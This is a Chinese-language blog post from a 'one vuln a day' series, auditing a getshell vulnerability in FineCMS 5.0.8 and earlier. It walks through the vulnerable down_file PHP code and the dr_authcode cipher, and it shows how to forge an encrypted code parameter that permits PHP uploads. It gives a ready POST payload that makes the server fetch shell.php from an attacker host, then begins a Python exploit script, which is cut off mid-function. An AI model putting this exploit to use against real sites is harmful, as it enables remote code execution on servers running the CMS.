@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞) - F0rmat&#39;Blog</title>
+<link rel="stylesheet" type="text/css" href="/css/main.css">
+</head>
+<body>
+<header>
+  <div>
+    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
+  </div>
+  <nav></nav>
+</header>
+<main>
+  <article>
+    <div class="title">
+  <h1>通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞)</h1>
+  </div>
+<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">
+<div class="container text-center mt-3">
+    <iframe src="https://duckduckgo.com/search.html?site=https://getshe11.com/&prefill=" style="overflow:hidden;margin:0;padding:0;max-width:80%;height:40px;" frameborder="0"></iframe>
+</div>
+</div>
+<div class="meta">
+  <div>2018-02-28 22:23</div>
+  <div>
+    <span><a href="https://getshe11.com/tags/php/">#php</a></span>
+      <span><a href="https://getshe11.com/tags/finecms/">#FineCMS</a></span>
+      <span><a href="https://getshe11.com/tags/getshell/">#getshell</a></span>
+      </div>
+  </div>
+<div class="content">
+  <h1 id="前言">前言</h1>
+<p>这几天都挺忙的，刚开学也在做比赛的培训，每天一洞这个事情一定得坚持下去，跟着上次的finecms，在<code>漏洞时代</code>又找了一个漏洞来审计。但是他改了函数里面的传参，我也弄了一阵子才搞明白这个传参原来需要加密过的参数，还有就是这个远程下载再上传，有个小问题，那篇文章没有说明，等下再系统说下。</p>
+<h1 id="漏洞详情">漏洞详情</h1>
+<h2 id="代码位置和代码">代码位置和代码</h2>
+<ul>
+<li>位置
+<code>\finecms\dayrui\controllers\member\Api.php</code></li>
+<li>代码</li>
+</ul>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">down_file</span>() {
+ 
+    $p <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
+    $url <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;&amp;&#39;</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;url&#39;</span>));
+    <span style="color:#75715e">//经过&amp; 分割
+</span><span style="color:#75715e"></span> 
+    <span style="color:#66d9ef">foreach</span> ($url <span style="color:#66d9ef">as</span> $t) {
+        $item <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;=&#39;</span>, $t);
+        $p[$item[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> $item[<span style="color:#ae81ff">1</span>];
+    }
+    <span style="color:#75715e">//经过 = 分割
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">!</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uid</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">fc_lang</span>(<span style="color:#e6db74">&#39;游客不允许上传附件&#39;</span>)));
+    <span style="color:#75715e">//对$p[&#39;code&#39;] 进行解码
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">list</span>($size, $ext) <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;|&#39;</span>, <span style="color:#a6e22e">dr_authcode</span>($p[<span style="color:#e6db74">&#39;code&#39;</span>], <span style="color:#e6db74">&#39;DECODE&#39;</span>));
+    <span style="color:#75715e">//得到尺寸和后缀
+</span><span style="color:#75715e"></span>    $path <span style="color:#f92672">=</span> <span style="color:#a6e22e">SYS_UPLOAD_PATH</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#39;Ym&#39;</span>, <span style="color:#a6e22e">SYS_TIME</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/&#39;</span>;
+    <span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($path) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">dr_mkdirs</span>($path);
+ 
+    $furl <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;file&#39;</span>);
+    $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">dr_catcher_data</span>($furl);
+    <span style="color:#75715e">//dr_catcher_data 是读取远程文件
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">!</span>$file <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;获取远程文件失败&#39;</span>));
+ 
+    $fileext <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>(<span style="color:#a6e22e">trim</span>(<span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">strrchr</span>($furl, <span style="color:#e6db74">&#39;.&#39;</span>), <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10</span>))); <span style="color:#75715e">//扩展名
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">!@</span><span style="color:#a6e22e">in_array</span>($fileext, <span style="color:#f92672">@</span><span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;,&#39;</span>, $ext)) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;远程文件扩展名（&#39;</span><span style="color:#f92672">.</span>$fileext<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;）不允许&#39;</span>));
+     
+    $filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">time</span>()), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">7</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">999</span>);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">@</span><span style="color:#a6e22e">file_put_contents</span>($path<span style="color:#f92672">.</span>$filename<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>$fileext, $file)) {
+        $info <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+            <span style="color:#e6db74">&#39;file_ext&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>$fileext,
+            <span style="color:#e6db74">&#39;full_path&#39;</span> <span style="color:#f92672">=&gt;</span> $path<span style="color:#f92672">.</span>$filename<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>$fileext,
+            <span style="color:#e6db74">&#39;file_size&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">filesize</span>($path<span style="color:#f92672">.</span>$filename<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>$fileext)<span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span>,
+            <span style="color:#e6db74">&#39;client_name&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>,
+        );
+</code></pre></div><h2 id="执行过程">执行过程</h2>
+<h3 id="payload代码">Payload代码</h3>
+<p><code>http://finecmstest.com/index.php?s=member&amp;c=api&amp;m=down_file</code></p>
+<p>POST:url=code=d628NBt44h5NLBYyi2QIPBI37HOHqQJz/JvPubFBaG5c&amp;file=http://192.168.232.128/shell.php</p>
+<h3 id="执行结果">执行结果</h3>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_down1.png" alt="finecms_down1"></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_down2.png" alt="finecms_down1"></p>
+<h2 id="分析过程">分析过程</h2>
+<p>老样子，挑重要的代码来读，跟着我的思路能读懂这段函数的流程。</p>
+<ul>
+<li><code>$p = array();</code>创建一个数组，为下面的遍历赋值所用。
+<code>$url = explode('&amp;', $this-&gt;input-&gt;post('url'));</code>接收url参数的值，<code>explode</code>这个函数就不用多说了，用于把字符串转换成数组，以<code>&amp;</code>分割为一个数组。
+<code>foreach ($url as $t) {$item = explode('=', $t);$p[$item[0]] = $item[1];}</code> 这一段遍历就是把上面的数组赋值给$p变量。
+<code>!$this-&gt;uid &amp;&amp; exit(dr_json(0,fc_lang('抱歉！游客不允许上传附件')));</code>判断是否登录</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$p <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
+        $url <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;&amp;&#39;</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;url&#39;</span>));
+        <span style="color:#66d9ef">foreach</span> ($url <span style="color:#66d9ef">as</span> $t) {
+            $item <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;=&#39;</span>, $t);
+            $p[$item[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> $item[<span style="color:#ae81ff">1</span>];
+        }
+        <span style="color:#f92672">!</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uid</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">fc_lang</span>(<span style="color:#e6db74">&#39;抱歉！游客不允许上传附件&#39;</span>)));
+</code></pre></div><ul>
+<li>这段用了<code>list</code>函数，就是把<code>explode</code>的三个值赋值给<code>$size, $ext, $path</code>, 当中用了<code>dr_authcode</code>这个函数，跟进了一下这个函数在<code>\finecms\dayrui\helpers\function_helper.php</code>里面，是一段discuz加密/解密的函数，这个函数主要看的是<code>$key = md5($key ? $key : SYS_KEY);</code>和<code>$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string . $keyb), 0, 16) . $string;$string_length = strlen($string);</code>这两句，<code>SYS_KEY</code>这个值在上一篇文章看过了，值是固定的，所以不用理会。下来一句就是如果$operation == &lsquo;DECODE&rsquo;那就解密，如果不等于DECODE那就加密。</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">list</span>($size, $ext, $path) <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;|&#39;</span>, <span style="color:#a6e22e">dr_authcode</span>($p[<span style="color:#e6db74">&#39;code&#39;</span>], <span style="color:#e6db74">&#39;DECODE&#39;</span>));
+</code></pre></div><p><strong>dr_authcode函数代码：</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">dr_authcode</span>($string, $operation <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;DECODE&#39;</span>, $key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>, $expiry <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$string) {
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>;
+    }
+
+    $ckey_length <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
+
+    $key <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($key <span style="color:#f92672">?</span> $key <span style="color:#f92672">:</span> <span style="color:#a6e22e">SYS_KEY</span>);
+    $keya <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">substr</span>($key, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>));
+    $keyb <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">substr</span>($key, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">16</span>));
+    $keyc <span style="color:#f92672">=</span> $ckey_length <span style="color:#f92672">?</span> ($operation <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;DECODE&#39;</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">substr</span>($string, <span style="color:#ae81ff">0</span>, $ckey_length) <span style="color:#f92672">:</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">microtime</span>()), <span style="color:#f92672">-</span>$ckey_length)) <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>;
+
+    $cryptkey <span style="color:#f92672">=</span> $keya <span style="color:#f92672">.</span> <span style="color:#a6e22e">md5</span>($keya <span style="color:#f92672">.</span> $keyc);
+    $key_length <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($cryptkey);
+
+    $string <span style="color:#f92672">=</span> $operation <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;DECODE&#39;</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">substr</span>($string, $ckey_length)) <span style="color:#f92672">:</span> <span style="color:#a6e22e">sprintf</span>(<span style="color:#e6db74">&#39;%010d&#39;</span>, $expiry <span style="color:#f92672">?</span> $expiry <span style="color:#f92672">+</span> <span style="color:#a6e22e">time</span>() <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">.</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>($string <span style="color:#f92672">.</span> $keyb), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">.</span> $string;
+    $string_length <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($string);
+
+    $result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+    $box <span style="color:#f92672">=</span> <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">255</span>);
+
+    $rndkey <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
+    <span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">255</span>; $i<span style="color:#f92672">++</span>) {
+        $rndkey[$i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ord</span>($cryptkey[$i <span style="color:#f92672">%</span> $key_length]);
+    }
+
+    <span style="color:#66d9ef">for</span> ($j <span style="color:#f92672">=</span> $i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; $i<span style="color:#f92672">++</span>) {
+        $j <span style="color:#f92672">=</span> ($j <span style="color:#f92672">+</span> $box[$i] <span style="color:#f92672">+</span> $rndkey[$i]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>;
+        $tmp <span style="color:#f92672">=</span> $box[$i];
+        $box[$i] <span style="color:#f92672">=</span> $box[$j];
+        $box[$j] <span style="color:#f92672">=</span> $tmp;
+    }
+
+    <span style="color:#66d9ef">for</span> ($a <span style="color:#f92672">=</span> $j <span style="color:#f92672">=</span> $i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $string_length; $i<span style="color:#f92672">++</span>) {
+        $a <span style="color:#f92672">=</span> ($a <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>;
+        $j <span style="color:#f92672">=</span> ($j <span style="color:#f92672">+</span> $box[$a]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>;
+        $tmp <span style="color:#f92672">=</span> $box[$a];
+        $box[$a] <span style="color:#f92672">=</span> $box[$j];
+        $box[$j] <span style="color:#f92672">=</span> $tmp;
+        $result<span style="color:#f92672">.=</span> <span style="color:#a6e22e">chr</span>(<span style="color:#a6e22e">ord</span>($string[$i]) <span style="color:#f92672">^</span> ($box[($box[$a] <span style="color:#f92672">+</span> $box[$j]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>]));
+    }
+
+    <span style="color:#66d9ef">if</span> ($operation <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;DECODE&#39;</span>) {
+        <span style="color:#66d9ef">if</span> ((<span style="color:#a6e22e">substr</span>($result, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">substr</span>($result, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>) <span style="color:#f92672">-</span> <span style="color:#a6e22e">time</span>() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">substr</span>($result, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">substr</span>($result, <span style="color:#ae81ff">26</span>) <span style="color:#f92672">.</span> $keyb), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>)) {
+            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">substr</span>($result, <span style="color:#ae81ff">26</span>);
+        } <span style="color:#66d9ef">else</span> {
+            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>;
+        }
+    } <span style="color:#66d9ef">else</span> {
+        <span style="color:#66d9ef">return</span> $keyc <span style="color:#f92672">.</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;=&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#a6e22e">base64_encode</span>($result));
+    }
+}
+</code></pre></div><ul>
+<li>这段代码就是生成文件的路径，<code>dr_mkdirs</code>在上一篇的已经解释过了，生成的目录是日期。</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> $path <span style="color:#f92672">=</span> <span style="color:#a6e22e">SYS_UPLOAD_PATH</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#39;Ym&#39;</span>, <span style="color:#a6e22e">SYS_TIME</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/&#39;</span>;
+        <span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($path) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">dr_mkdirs</span>($path);
+</code></pre></div><ul>
+<li>继续下面这段,<code>$furl</code>是获取file参数的值，<code>dr_catcher_data</code>这个函数可以跟进看下，只要是获取远程文件的内容的。如果远程文件没有内容就获取失败。</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">        $furl <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;file&#39;</span>);
+        $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">dr_catcher_data</span>($furl);
+        <span style="color:#f92672">!</span>$file <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;获取远程文件失败&#39;</span>));
+</code></pre></div><ul>
+<li>这段是判断扩展名的，在这里也说下这几个函数的作用吧，<code>strrchr</code>是把<code>$ful</code>的内容中.后面的值和.一起提取出来；<code>substr</code>返回字符串中1-10的字符串，也就是说刚才提取出来的扩展名<code>.php</code>从1开始只要php；<code>trim</code>去掉两边的空格；<code>strtolower</code>把字符串全部变成小写。
+再下来这句就是判断上传的文件的扩展名<code>$fileext</code>是否在<code>$ext</code>里面。</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$fileext <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>(<span style="color:#a6e22e">trim</span>(<span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">strrchr</span>($furl, <span style="color:#e6db74">&#39;.&#39;</span>), <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10</span>))); <span style="color:#75715e">//扩展名
+</span><span style="color:#75715e"></span><span style="color:#f92672">!@</span><span style="color:#a6e22e">in_array</span>($fileext, <span style="color:#f92672">@</span><span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;,&#39;</span>, $ext)) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;远程文件扩展名（&#39;</span><span style="color:#f92672">.</span>$fileext<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;）不允许&#39;</span>));
+</code></pre></div><ul>
+<li>这段的内容就是写文件了，文件名是随机的。</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">time</span>()), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">7</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">999</span>);
+        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">@</span><span style="color:#a6e22e">file_put_contents</span>($path<span style="color:#f92672">.</span>$filename<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>$fileext, $file)) {
+            $info <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+                <span style="color:#e6db74">&#39;file_ext&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>$fileext,
+                <span style="color:#e6db74">&#39;full_path&#39;</span> <span style="color:#f92672">=&gt;</span> $path<span style="color:#f92672">.</span>$filename<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>$fileext,
+                <span style="color:#e6db74">&#39;file_size&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">filesize</span>($path<span style="color:#f92672">.</span>$filename<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>$fileext)<span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span>,
+                <span style="color:#e6db74">&#39;client_name&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>,
+            );
+</code></pre></div><h3 id="构造扩展名参数">构造扩展名参数</h3>
+<p>这块内容可以另外当作一节来讲，重新来理顺刚才讲的代码流程就能知道如何来构造扩展名的参数。
+我们逆过来看：
+1.判断<code>$ext</code>里面的扩展名
+2.<code>$ext</code>变量获取在<code>$p['code']</code>数组里面
+3.<code>$p['code']</code>要经过<code>dr_authcode</code>函数的解密
+4.<code>$p['code']</code>又是从$url数组里面提取出来
+所以这里我们可以看到<code>$ext</code>是可控的，而我们要传入加密的<code>$p['code']</code>，我们用<code>dr_authcode</code>加密一遍就行了，在程序里面加入这句代码<code>echo dr_authcode(&quot;|php&quot;,&quot;a&quot;);</code>就可以得出加密的值，这个a可以写任意值，只要不写<code>DECODE</code>就行了。<code>|php</code>加密这个就是为了<code>list</code>这个函数的作用。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">        $url <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;&amp;&#39;</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;url&#39;</span>));
+        <span style="color:#66d9ef">foreach</span> ($url <span style="color:#66d9ef">as</span> $t) {
+            $item <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;=&#39;</span>, $t);
+            $p[$item[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> $item[<span style="color:#ae81ff">1</span>];
+        }
+        <span style="color:#f92672">!</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uid</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">fc_lang</span>(<span style="color:#e6db74">&#39;抱歉！游客不允许上传附件&#39;</span>)));
+        <span style="color:#75715e">//echo dr_authcode(&#34;|php&#34;,&#34;a&#34;);
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">list</span>($size, $ext, $path) <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;|&#39;</span>, <span style="color:#a6e22e">dr_authcode</span>($p[<span style="color:#e6db74">&#39;code&#39;</span>], <span style="color:#e6db74">&#39;DECODE&#39;</span>));
+        $fileext <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>(<span style="color:#a6e22e">trim</span>(<span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">strrchr</span>($furl, <span style="color:#e6db74">&#39;.&#39;</span>), <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10</span>))); <span style="color:#75715e">//扩展名
+</span><span style="color:#75715e"></span>        <span style="color:#f92672">!@</span><span style="color:#a6e22e">in_array</span>($fileext, <span style="color:#f92672">@</span><span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;,&#39;</span>, $ext)) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;远程文件扩展名（&#39;</span><span style="color:#f92672">.</span>$fileext<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;）不允许&#39;</span>));
+</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_down3.png" alt="finecms_down3"></p>
+<p>构造出url的参数为：<strong>url=code=ad3eXTkH4Wt084pW46p7DBSt1KX0FwthAs4o9oBH8WVi</strong></p>
+<h3 id="构造file参数">构造file参数</h3>
+<p>构造代码：file=http://192.168.232.128/shell.php</p>
+<p>事情没有想得那么简单，这个函数的作用是下载然后再上传，它只是获取显示出来的html的内容然后把这些内容下载下来。所以我们直接在远程服务器写php文件是不可行的。
+远程的服务器有一个要求，就是不解析PHP文件，不解析，不就把内容显示出来了么。
+最简单的方法就是用装一个apache写一个php文件就行了。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_down4.png" alt="finecms_down4"></p>
+<h1 id="用python写getshell脚本">用Python写Getshell脚本</h1>
+<p>写这个脚本也是要注册登录获取登录后的状态再getshell
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_down5.png" alt="finecms_down5">
+<code>finecms_down_file.py</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">author:F0rmat
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">import</span> random
+<span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> json
+<span style="color:#f92672">import</span> time
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(target,rtarget):
+    username <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">999999</span>)
+    seed <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>
+    email <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
